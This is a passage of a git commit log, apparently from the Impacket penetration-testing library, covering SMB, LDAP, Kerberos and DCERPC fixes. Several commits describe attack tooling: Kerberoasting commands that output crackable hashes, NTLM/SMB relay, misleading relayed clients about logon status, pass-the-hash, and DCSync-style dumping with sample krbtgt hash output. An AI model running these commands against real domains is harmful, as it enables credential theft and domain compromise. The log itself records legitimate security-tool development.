    * Minor fixups in imports and cosmetic changes as well. There's some more code cleaning and variable naming left.

commit 8fa21746e4395b38664f5bbb4700357a95daf489
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:33:08 2016 -0300

    Imports fixups and minor cosmetic changes

commit 806ce6905a5c669300e8ce315ae1198242372151
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:13:21 2016 -0300

    Empty file

commit cd97e0f8226b819a76e67e822e2dc2320b9c595e
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:03:06 2016 -0300

    Fixed wrong structure sent to SMBClient preventing SMB Relay
    
    * Instead of rawtoken (didn't exist) it must be SPNEGO_token
    * Import fixups and minor cosmetic changes

commit c5c50bf2085d07b36b15af31e2187bd92a4ed68a
Merge: d96a5370 24dfd3a4
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 16:41:22 2016 -0300

    Merge branch 'master' of https://github.com/fox-it/impacket into fox-it-master

commit d96a537059e47131dd79ce05585a41e01aad3b13
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 16:39:35 2016 -0300

    Adding lastLogon to the output as well

commit 24dfd3a4226469f37cd889bef90ba76bd3d60916
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri May 27 12:35:10 2016 +0200

    ntlmrelayx

commit 6ab19e5fbe6e4fd4f4c793c69b7bdb0ae887d1a9
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:20:45 2016 -0300

    No need to close the SMB Connection

commit f5a053ac38f079787d6d65797d129cbb38286bf2
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:17:39 2016 -0300

    Improving the LDAP search filter to minimize traffic
    
    * We're now asking for:
    (&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=UF_NORMAL_ACCOUNT)(!(UserAccountControl:1.2.840.113556.1.4.803:=UF_ACCOUNTDISABLE)))
    Basically will return the normal accounts, not expired, that has an SPN set.

commit 855561685eefa837c875ab7b45e6db0f1221cb4a
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:10:32 2016 -0300

    Changing Kerberos auth mechanism from GSSAPI to GSS-SPNEGO plus minor fixed
    
    * Solves the issue of kerberosLogin still not working after pyasn1 upgrade (https://github.com/CoreSecurity/impacket/issues/162)
    * LDAP search accepts sizeLimit now
    * Better error descriptions
    * Fixed some LDAP ASN1 definitions

commit f978950f33e712459c0f08d07a98fbecb02096f8
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:08:46 2016 -0300

    Socket more meaninful information when socket operation failed
    
    * Good for realizing there's a DNS resolve issue

commit 46bbd3ddee56ea39d3796e8581ae8eb01f631b88
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:04:29 2016 -0300

    Parsing MSRPC_FAULT as probably response during bind() operation
    
    * Win 2012R2 sends MSRPC_FAULT instead of MSRPC_BINDNAK

commit 2408f3aed454f6c42a5ccb7b09526ef88941481d
Author: asolino <bethus@gmail.com>
Date:   Tue May 24 23:38:38 2016 -0300

    Making it work with pyasn1-0.1.8
    
    * kerberosLogin still doesn't work tho. Don't know exactly why
    * Partially address https://github.com/CoreSecurity/impacket/issues/162
    * Works with pyasn1-0.1.7 as well

commit a8576c017295b39915af1b2ff2874d19a3b83a77
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 21:16:15 2016 -0300

    Reformatting some code

commit 0b1a28bfdd53466b9bed502a0740d6fe8aab8b6b
Merge: caf47e5f bc83d987
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 16:24:37 2016 -0300

    Merge branch 'mgeeky-master'

commit bc83d9870f3d8e255a563cf481c9351730bf7542
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 16:23:59 2016 -0300

    Using argparse choices to specify -s options

commit 4b81a6a4ed53621ae7322e6775538f9ab909f8e5
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 16:14:50 2016 -0300

    No need to create the dictionaries with STATUS messages
    
    * We have them in nt_errors.ERROR_MESSAGES

commit d7bcae1c08a32e3bc4718f87ca440ba312754b12
Author: Mariusz B <mariusz.bit@gmail.com>
Date:   Wed May 18 18:35:26 2016 +0200

    Forgot to add default return status values in case setReturnStatus was not invoked.

commit 23e44f1869de5f04a23ba1c910f2179dd60b51e7
Author: mgeeky <mgeeky@users.noreply.github.com>
Date:   Wed May 18 17:44:03 2016 +0200

    Added logging of the status code returned to the connecting client.

commit b1af0b52cb54a5ecfb5968e5b69e83049f3846c9
Author: mgeeky <mgeeky@users.noreply.github.com>
Date:   Wed May 18 17:43:19 2016 +0200

    Added some comments and input parameter value validation

commit a8354a1b7424a0bac07a520870f957a8dffeaa6f
Author: mgeeky <mgeeky@users.noreply.github.com>
Date:   Wed May 18 17:42:31 2016 +0200

    Added option to specify return status code after connecting client's successful authentication (relayed). This will be useful in cases in which we do not want to let connecting client store credentials that succeeded (i.e. remember them and proceed with successful authentication). There are some cases in which we may want to inform the client that his credentials were invalid (STATUS_LOGON_FAILURE) where in fact they went through. Also, we may mislead the client with information that the Access is Denied when authentication to e.g. ADMIN$ share at the server.

commit caf47e5f76d27b8e2c23ad40a75bc96920ea8434
Author: asolino <bethus@gmail.com>
Date:   Mon May 16 09:23:23 2016 -0300

    Fixes broken connection if -dc-ip is not specified
    
    * Introduced in latest commit. Should work now

commit 5fa74d87f2e5df69fb71e6d81b312b46c9801dfd
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 20:44:00 2016 -0300

    Reformating code

commit d4d6de0edf373322bddeef8b571eaa2f7da8b64e
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 19:54:28 2016 -0300

    Making DCERPC/LDAP/Kerberos IPv6 compliant
    
    * Looks like IPv6 is still not used much ;). These tiny things were preventing IPv6 from working at the DCERPC/LDAP/Kerberos layers.
    * SMB was working correctly

commit 2a36f54dd8b767113fc42d3117e8a3a30deb9959
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 19:23:27 2016 -0300

    Adding more statements into the try: execept.
    
    * It wasn't behaving well when no stringbinding was chosen for target

commit 01ad6ac79d344a0ba2c69f6c8893ce8ecfd2ccca
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 19:17:57 2016 -0300

    Warn if we couldn't find a valid string binding.. Shouldn't be common

commit 8d8aab419fa17ce7d922a307f1c7ed0ed8e0b130
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 18:47:15 2016 -0300

    Empty domain check fixed

commit b6f28459970a4fc0a63dce9323da97287ada1322
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 18:46:20 2016 -0300

    Reformating code
    
    * To keep it within 80 chars wide
    * Empty domain check fixed

commit 21a58e81d95a9b6e609290fdb7640d341025139d
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 18:29:34 2016 -0300

    Improved stringBinding selection
    
    * As reported in https://github.com/CoreSecurity/impacket/issues/158, there could be some instances where the wrong stringBinding would be chosen.
    * Testing needed to verify it's now working well

commit 061917c20430908b702a707e0c5b200375cc1c7d
Author: asolino <bethus@gmail.com>
Date:   Sat May 14 16:30:41 2016 -0300

    Adding -save parameter
    
    * Saves each TGS downloaded in ccache format. Why? If we later on crack any password we can just edit that one and make it silver

commit 75c647513bc124d7a8a7664ff161e04774e00172
Author: asolino <bethus@gmail.com>
Date:   Sat May 14 16:29:34 2016 -0300

    Replacing class variables for instance variables
    
    * Don't know why I did it this way to begin with. Not needed

commit 14010a4142004e5a048481b99f5911bfe03c0a92
Author: asolino <bethus@gmail.com>
Date:   Sat May 14 15:47:16 2016 -0300

    -dc-ip parameter moved to the authentication group
    
    * makes more sense. Should do the same for goldenPac and probably and this option for all scripts

commit 9d717a318a888aa1659385f724e0f90c7fa8a62e
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 20:35:09 2016 -0300

    This script should now work w/o requiring DNS resolution
    
    * Even if Kerberos authentication is specified

commit a1117e84ff2c300773d2faed72262f4558a03ef0
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 20:20:56 2016 -0300

    Fixes small typo
    
    * It was copied from goldenPac.py

commit 0d73b2c858ca3e46ad6b89ef4dcb1f76920b03d7
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 20:17:07 2016 -0300

    Adding -dc-ip command line option
    
    * Allows specifying what the IP for the domain is.
    * It assumes the DC and KDC resides in the same server
    
    e.g.
    ./GetUserSPNs.py -dc-ip 172.16.123.170 -request freefly.net/normaluser

commit fcf0c2ad8f52c277bd9072da93b7028607d6ba97
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 19:24:46 2016 -0300

    Fix when dumping CLEARTEXT password for machine accounts
    
    * We won't utf-16 decode them, we will just print it in hex

commit 162b23bf0b8c24d2ce7388793a79b428780ea617
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 19:18:01 2016 -0300

    Fix error when passing NTLM hashes for authentication

commit eaf8a03251e4fb87af289e9ba33eaebaa6617a0f
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 19:07:30 2016 -0300

    Adding -request and -outputfile options
    
    * -request picks SPNs for unique usernames and outputs JtR/hashcat format
    * -outputFile, well.. outputs to a file for later cracking :)
    
    Sample usage:
    ./GetUserSPNs.py freefly.net/normaluser7 -request -outpufile /tmp/hashes.txt

commit 2a185c1ecc0b0a56467f12dfccbd5672ed95adaa
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 12:47:08 2016 -0300

    Adding GetUserSPNs (part of Kerberoast attack)
    
    This module will try to find Service Principal Names that are associated with normal user account.
    Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
    will encrypt the ticket with the account the SPN is running under, this could be used for an offline
    bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
    This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
    https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
    
    Original idea of implementing this in Python belongs to @skelsec and his
    https://github.com/skelsec/PyKerberoast project
    
    This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
    Also, disabled accounts won't be shown.
    
    ToDo:
    [ ] Add the capability for requesting TGS and output them in JtR/hashcat format
    [ ] Improve the search filter, we have to specify we don't want machine accounts in the answer
        (play with userAccountControl)

commit 501ef71b737ebef4928d655eeb21e52ceba859af
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 12:44:36 2016 -0300

    Adding ldap directory to the setup.py for library installation

commit 53477252e67bab62d86e571b04d91d7ff8d74917
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 12:39:59 2016 -0300

    Adding a minimalistic LDAP implementation
    
    * Supports ldap and ldaps
    * Supports Pass the hash, ticket and key
    * Only search is available (and you need to build the search filter yourself)

commit 375b9972dc5696a1967df56a3cec3d87c64b9a47
Author: asolino <bethus@gmail.com>
Date:   Sat May 7 16:54:43 2016 -0300

    Changes the output filename based on the share specified.
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/156
    * Debug message added

commit 34e5a814ce37fa43aae6168b423185cc6b9347cd
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 15:39:23 2016 -0300

    Updated test cases

commit f8b900f2a8adae3dbfb79c123f76f2b57a2022a3
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 14:56:46 2016 -0300

    Remaining fixes for ERROR_DS_DIFFERENT_REPL_EPOCHS
    
    * Test cases and raiseChild were also affected

commit 106934377c2ea4d41458d97f42807057b97250ec
Merge: 5b92375f 4ee5c841
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 14:44:17 2016 -0300

    Merge branch 'skelsec-master'

commit 4ee5c841263ba5c7ecab2a542cf064180931b183
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 14:43:05 2016 -0300

    Creating new cipher based on received keytype
    
    * This was preventing pass-the-key attacks to work

commit ea0a1e364aa863cbe8fba772ec0036d873c6ed58
Merge: 5b92375f 63c4aaf5
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 13:29:28 2016 -0300

    Merge branch 'master' of https://github.com/skelsec/impacket into skelsec-master

commit 5b92375f9f0143fbc5cef49294d86ae2c6aa788c
Author: asolino <bethus@gmail.com>
Date:   Thu May 5 11:35:54 2016 -0300

    pwdLastSet is also included in the output file
    
    * According to @mubix this won't interfere with JtR :)

commit b6b2b1db7cd4ffbf38ed2e905b047daa8d6bc19a
Author: asolino <bethus@gmail.com>
Date:   Thu May 5 11:23:52 2016 -0300

    More debug messages added

commit bcff6bc38cf8441723f06c307e68aaa6f40b31dc
Author: asolino <bethus@gmail.com>
Date:   Thu May 5 10:54:15 2016 -0300

    Adding more debug information for helping troubleshooting

commit 63c4aaf5f4ea38ff9218fdf231c098a5026f49b9
Author: skelsec <info@skelsec.com>
Date:   Thu May 5 13:05:32 2016 +0200

    TGS Request sessionkey type update
    
    Here we should use the type that we got back from the server.

commit 5db6cf60cf3acd8c55136da33c6d7a68389787a5
Author: skelsec <info@skelsec.com>
Date:   Thu May 5 13:01:34 2016 +0200

    TGS Request ETYPE field values
    
    etype field here MUST contain rc4_hmac in a windows environment, or the response will be KDC_ERR_ETYPE_NOSUPP.

commit a489c032f2cc2748bb91ae6b24d28308ea210a2b
Author: asolino <bethus@gmail.com>
Date:   Sun May 1 21:21:14 2016 -0300

    Extra line removed. Cosmetic

commit 7c34db9948dd48275d85b6cee7675a2ac1d079b9
Author: asolino <bethus@gmail.com>
Date:   Sun May 1 21:14:45 2016 -0300

    Fix ERROR_DS_DIFFERENT_REPL_EPOCHS when running against a domain with dwReplEpoch != 0
    
    * By default we set dwReplEpoch to 0 when calling DRSBind(). If this call's answer specifies a different dwReplEpoch, then we call DRSBind again with the right one. Otherwise calls will fail later.
    * Thanks @gentilkiwi for reporting it in impacket, @MichaelGrafnetter for reporting it to mimikatz and @rmbolger for reporting it DSInternals :)

commit b05feb2f5aefb1d434f48727785b16b07fd518a5
Author: asolino <bethus@gmail.com>
Date:   Sun May 1 20:32:56 2016 -0300

    Updated test cases
    
    * Added test cases for packet fragmentation and session security (both Kerberos and NTLM)
    * Simplified the structure of the test cases

commit bba72c234ba694cf7b70c94ce1a3a240990d3b1a
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 29 19:58:17 2016 -0300

    Packet fragmentation review
    
    1) Checks the right PDU len based on user input (if set using set_max_fragment_size()) or BIND_ACK answer (max_rfrag)
    2) Fixed wrong signature/encryption calculation when using Kerberos and fragmentation enabled.
    3) Header flags renamed based on C706 standard
    4) Will probably address https://github.com/CoreSecurity/impacket/issues/137

commit 7c49b28ff5a18702f87684d844fdfce127a451a1
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 15 13:14:01 2016 -0300

    Few fixes to SMB Test cases
    
    1. Fix readwriteFile testcase to support large reads
    2. getServerName converting to upper case when comparing
    3. Credentials are now taken from dcetests.cfg (we should change the name in the future)

commit dc4606822e489e62d276bc3c928af31cd860f4a0
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 15 13:09:42 2016 -0300

    STATUS_USER_SESSION_DELETED when downgrading from SMB2_DIALECT_30 to SMB2_DIALECT_21/SMB2_DIALECT_002
    
    * Since we're not supporting multichannel, we're taking the approach described at http://linux-cifs.vger.kernel.narkive.com/WffA8Jw5/status-user-session-deleted-auth-problems-when-downgrading-from-vers-3-0-to-vers-2-0-2-1 by simply randomizing the ClientGUID when negotiating the protocol.
    * This code was triggering the issue:
    
    from impacket.smbconnection import *
    
    USERNAME = 'Administrator'
    PASSWORD = 'admin'
    TARGET = '192.168.1.1'
    
    s1 = SMBConnection(TARGET, TARGET)
    s1.login(USERNAME, PASSWORD)
    
    s2 = SMBConnection(TARGET, TARGET, preferredDialect=SMB2_DIALECT_21)
    s2.login(USERNAME, PASSWORD)
    
    print "ALL GOOD"

commit 49a07a5fa7372abd7a6b5eeec8d039b1add4e86d
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 11 10:58:16 2016 -0300

    Retrieve user principal name from CCache file
    
    * When https://github.com/CoreSecurity/impacket/pull/144/files was merged we forgot to also add
    that support to the getKerberosType1 method.
    * Will probably fix https://github.com/CoreSecurity/impacket/issues/149, needs testing.

commit 19d7cfca5797635abc251324449945ead65c4052
Merge: de8b2556 e42d8e18
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 30 09:29:27 2016 -0300

    Merge pull request #146 from byt3bl33d3r/master
    
    UnboundLocalError in smbconnection.readFile() when recieving STATUS_END_OF_FILE error

commit e42d8e183a8766d49c799348db17b9d0e656ec0a
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Mar 29 23:43:31 2016 -0600

    Fixed while loop in smbconnection.read() when STATUS_END_OF_FILE is received

commit de8b2556789a2e78cd0a16e38f40bc567a6873c9
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 29 16:54:17 2016 -0300

    Fixes offline dump of SAM hashes (no NTDS.DIT)
    
    * This was broken at https://github.com/CoreSecurity/impacket/commit/bbff44d1fc555e2de2ffeef1e9f7bb89afd2946b
    * A proposed solution was PRed here https://github.com/CoreSecurity/impacket/pull/145 . This is basically the same with samller changes
    * Thanks @MrTchuss for finding this!

commit 3b819e2fdea5161d664f9b04cdb89d4a0e8179b5
Merge: 0df01009 94305070
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 28 11:51:26 2016 -0300

    Merge pull request #144 from MrTchuss/master
    
    Retrieve user principal name from CCache file

commit 0df0100998736d949ca9cd8c7e7b2d829952afdc
Author: asolino <bethus@gmail.com>
Date:   Sun Mar 27 15:18:18 2016 -0300

    Honoring extended_security parameter in SMB.neg_session()
    
    * When we did the SMBv1 Unicode support (https://github.com/CoreSecurity/impacket/commit/328caf150446658ec2621e7a2cd28e6c39cc8da0) we changed the default flags1/flags2 from `0` to `SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES`. We forgot tho, to change the behavior en SMB.neg_session() when `extended_security` was set to False. What was happening was the `FLAGS2_EXTENDED_SECURITY` was never removed.
    * This was preventing establishing negotiations with `FLAGS2_EXTENDED_SECURITY` set to False (aka standard security). In particular this was breaking the SMB Reflection use case.

commit 9430507030c931d4edf2465e4411e43719c344be
Author: MrTchuss <mrtchuss@users.noreply.github.com>
Date:   Sat Mar 26 21:07:54 2016 +0100

    Retrieve user principal name from CCache file
    
    If needed, retrieve user and domaine information from KRB5 CCache file.
    This simplifies examples command-line, as user only needs to export
    KRB5CCNAME environment variable after a successful authentication using
    kinit and do not need to specify user principal name on command line:
    $ export KRB5CCNAME=/tmp/krb5cc_1000
    $ smbclient.py -k win2012-dc1.vulnerable.local

commit 04d392083a8621e1f81449f73599ec2238aaf1c6
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 25 23:01:47 2016 -0300

    If we cannot decode Unicode let's print the data w/o decoding
    
    * This could happen when SMB Reflecting against old OSes.

commit c6fb099ba27f978ab762226dffc688f034c3754c
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 25 22:59:41 2016 -0300

    If NT ERROR string is not found just print the error code

commit a71e6bb0f9b04251009f3b995571c03a1dfcb0f8
Merge: 6d42da90 ed375b97
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 24 19:51:01 2016 -0300

    Merge pull request #142 from rrerolle/master
    
    SMB3.create: use proper method to determine SMB2 and SMB2Create headers sizes

commit ed375b97d19575970e6c1d873f28620238488053
Author: Rémi Rérolle <remi.rerolle@gmail.com>
Date:   Thu Mar 24 16:53:51 2016 +0100

    SMB3.create: use proper method to determine SMB2 and SMB2Create headers sizes
    
    This prevents from needing a commentary to explain what those hard-coded values
    stand for.

commit 6d42da9003d28bd6ab3446396c65d9f60de16848
Merge: 518abf37 df4c9552
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 23 14:31:00 2016 -0300

    Merge pull request #140 from rrerolle/master
    
    SMB3.create: define CreateContextsOffset and CreateContextsLength when applicable

commit df4c95522d406455011e9f77c699fb84db891d1d
Author: Rémi Rérolle <remi.rerolle@gmail.com>
Date:   Wed Mar 23 17:54:45 2016 +0100

    SMB3.create: define CreateContextsOffset and CreateContextsLength when applicable
    
    When providing createContexts in a SMB3 create call, the buffer is set
    accordingly, but not the offset and length fields. This causes the createContext
    data to be ignored by the server.
    
    This patch tries to fix this by specifying the offset and length. The offset is
    determined by adding the size of the SMB2 and CREATE_REQUEST headers to the
    name length.

commit 518abf375538f0ed80b84b95fa26e211f78bf80c
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 11 13:19:43 2016 -0300

    Reverting back previous commit. Problems with some Windows clients
    
    * More research needed. OSx clients now only works if GUEST connection set.

commit b05b4703e702a6e6c48b423d2a7fea05fdab3768
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 11 13:09:50 2016 -0300

    Setting GUEST flag only if username is 'GUEST'
    
    * This is OSx specific in order to make it work when an OSx client wants to log in with a username/password

commit 3e768cc89080a06b735eed05c0e36e354cd8a86e
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 11 11:49:48 2016 -0300

    Clear NextEntryOffset when SL_RETURN_SINGLE_ENTRY is received
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/136

commit 1f98352aa1b51048e55ea8ddfa356cdde1c30b06
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 8 15:58:26 2016 -0300

    Fixing https://github.com/CoreSecurity/impacket/issues/135
    
    * LOG line left there just in case logging is active already.

commit 9494af8cd8bdb0eb44b20840aaf3f1b67dca49e1
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 2 18:01:35 2016 -0300

    Better controls strip leading '/'/'\\' when running the server in Windows
    
    * Regardless of the share configured, it was always showing the root drive contents (when ran on Windows)

commit 682ce151ddda2f2fd713546cbbec2ce28f79d032
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 29 16:59:04 2016 -0300

    Exposing SMBSERVER in SimpleSMBServer class
    
    * registerNamedPipe, unregisterNamedPipe and getRegisteredNamedPipes
    * Might be helpful if you want to create custom named pipes handlers thru the SimpleSMBServer

commit 1ef7978fe9d0d3baecb702ed2a77e55925e46821
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 29 16:32:51 2016 -0300

    Replacing NTLMSSP_NEGOTIATE_NTLM2 for NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    
    * Makes it easier to understand [MS-NLMP] when you're reading alongside our code

commit 79dda7fcbecb3e7d3e744ae5e4c181871f7ad212
Merge: e8dc587d 2e914bbb
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 26 10:38:35 2016 -0300

    Merge branch 'gadio-master'

commit 2e914bbbf3cafcf82942a637111a4a39a81c9a81
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 26 10:37:24 2016 -0300

    Changing -auth-level-pkt-privacy to -rpc-auth-level
    
    * By default it just let the runtime to decide what's best
    * Added option to enforce packet integrity as well

commit 49b9631104faa508e94496144b33771d462b3c89
Author: Gadi Oren <dbaspdp25g@snkmail.com>
Date:   Sun Feb 14 15:23:03 2016 -0500

    Allow setting packet privacy authentication level

commit e8dc587dab030787f2b2a23afebebae785e8018e
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 3 11:29:23 2016 -0300

    Minor improvements
    
    1) When ran With no parameters, now it runs in reflection mode and dumps target's hashes
    2) When relaying to 127.0.0.1, it's ok not to have a username. Especially important for hot potato attack
    3) Better control of exceptions when authentication succeded

commit 22313cc590b33218a4344e7c7ea48983f00ba89f
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 28 19:07:39 2016 -0300

    Adjusting NegotiateFlags to [MS-NLMP] 2.2.2.5 description
    
    * Check out your code if you were using these flags since names got changed
      according to the standard

commit a358566c98010fc0acc0779fd87980ef4adaac93
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 27 18:08:26 2016 -0300

    Adding -just-dc-user switch to download just a single user data (DRSUAPI mode only)
    
    * Similar to @gentilkiwi's DCSync functionality
    E.g.
    python secretsdump.py Administrator:admin@172.16.123.1 -just-dc-user krbtgt
    
    Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
    
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bf11f756a7cd1a29a9abd8ccc918a805:::
    [*] Kerberos keys grabbed
    krbtgt:aes256-cts-hmac-sha1-96:44b77486dd383d7177207bb7393f4ec4176fb80be7dcf5c598221a7a039bc2e9
    krbtgt:aes128-cts-hmac-sha1-96:2eb877b16640e7f60adb362c8e482f11
    krbtgt:des-cbc-md5:4610ea7024fff562
    [*] Cleaning up...

commit 1645f43ccf676ddb234c231816bf22d5ceca3c61
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 12 16:36:58 2016 -0300

    Upgrade Copyright

commit aa8bda15ebd49ce3aebb2691ccd1e8221aa7d885
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 11 18:29:46 2016 -0300

    Typo fix

commit 1cdc5ce8afff9236140edab1229a15e02cbf09d6
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 11 18:12:15 2016 -0300

    Adding support for Win2016 TP4 in LOCAL or -use-vss mode
    
    The main things that changed when raw parsing the NTDS.DIT are:
    1. The encryptedPEK header changed from '\x02\x00\x00\x00' to '\x03\x00\x00\x00'. Instead of
       using MD5 / RC4 it now uses AES to decrypt the PEK lists. Right now I only support 1 PEK
       key until I can repro having more than a key on this OS. Maybe @s0crat can help here ;).
    2. The decrypted PEK list is different from previous versions and the PEK Key sits in the
       middle of the decrypted buffer. I still need to understand what the other bytes are for.
    3. When decrypting NTHashes and supplemental information, the structure header changes from
       '\x11\x00\x00\x00' to '\x13\x00\x00\x00'. Instead of using RC4 it now uses AES. The
       structure here is a little different too, whereas the buffer for decryption starts 4
       bytes after a similar buffer in pre Win2016 TP4.
    
    Lot's of testing needed. Later on I'll work on simplifying the code.
    
    * Big thanks to @gentilkiwi for telling me about the issue and also giving me important info to come up with the solution.
    * DRSUAPI mode (the default one) worked out of the box
    * Moved __descryptAES to CryptoCommon since it's used on a few more places

commit f33daa056fd7cee38c2d65fdb42624ecaae09704
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 7 13:11:55 2016 -0300

    Going back to dev version

commit 67fc19e9996148add1b1e2a8b912fe8c95b51692
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 7 12:35:14 2016 -0300

    Updated Changelog

commit 0d34fd9365765c8c1d25e77393646d91d84da28a
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 7 11:12:01 2016 -0300

    Upcoming version

commit 8c04d9697939172c9159af92ddd0eded221f2106
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 14:08:30 2016 -0300

    Updating copyright notice. Welcome 2016

commit ac31fea5c1578e37eace0df83f1c2bf05350140e
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 13:25:31 2016 -0300

    Removing old DCERPC runtime files.
    
    * Scripts still using this old runtime should port to impacket.dcerpc.v5 classes
    * All examples should be using V5

commit 118688065e062e5f28307015d120b4ef4b1a3dd3
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 11:25:32 2016 -0300

    Moving KNOWN_UUIDS to epm.py before ditching the old dcerpc runtime

commit a4dc7d52f6ad3851ea29bbcf8938611df061eec1
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 11:21:47 2016 -0300

    Moving KNOWN_UUIDS to epm.py before ditching the old dcerpc runtime

commit 638a235b47157183cdc1cba940dfc9cb94c7fb28
Merge: 1140d519 e4d48634
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 10:28:54 2016 -0300

    Merge branch 'byt3bl33d3r-master'
    
    Thanks @byt3bl33d3r!

commit e4d4863430279b8b744e830a96bcddc8a0698562
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 10:27:27 2016 -0300

    Grabbing and printing command output when using -c switch
    
    * Also removing temp file

commit 5c6a3aee8ca6e506d2f4f4ebfd3c0fc6693e7ac5
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Jan 5 19:28:04 2016 -0700

    added option to execute commands in smbrelayx.py

commit 1140d519495e6d797d40e2b6db206f02e683b7d0
Merge: 1ef6af5a cb697154
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 5 13:00:06 2016 -0300

    Merge pull request #123 from mubix/patch-1
    
    Add Domain Admins RID

commit cb697154c084c265ad9f9537c62590dd46e41e1b
Author: Rob Fuller <jd.mubix@gmail.com>
Date:   Tue Jan 5 10:47:20 2016 -0500

    Add Domain Admins RID
    
    Source: https://msdn.microsoft.com/en-us/library/cc223144.aspx

commit 1ef6af5ac2493a93bcaee42f2af79df39b98cf6c
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 17 16:40:09 2015 -0300

    Minor cosmetic changes

commit b4c43aba5cdb8edc21a046263eb902885bfdc547
Merge: 270dcce3 88ccb48f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 17 09:00:55 2015 -0300

    Merge pull request #120 from sjitech/master
    
    smbclient.py: "cd" command failed to enter JUNCTION or read-only dire…

commit 88ccb48f2758caf2ff6e145da5bab426ab588ea2
Author: q <osexp2003@gmail.com>
Date:   Thu Dec 17 19:20:16 2015 +0900

    smbclient.py: "cd" command failed to enter JUNCTION or read-only directory

commit 270dcce3f2ff50106adab3c7a299d8549f67112f
Merge: 0999641a 08caa1d6
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 15 12:02:45 2015 -0300

    Merge branch 'sjitech-master'

commit 08caa1d6ee153af83ab02b87ba017450a429a985
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 15 11:51:07 2015 -0300

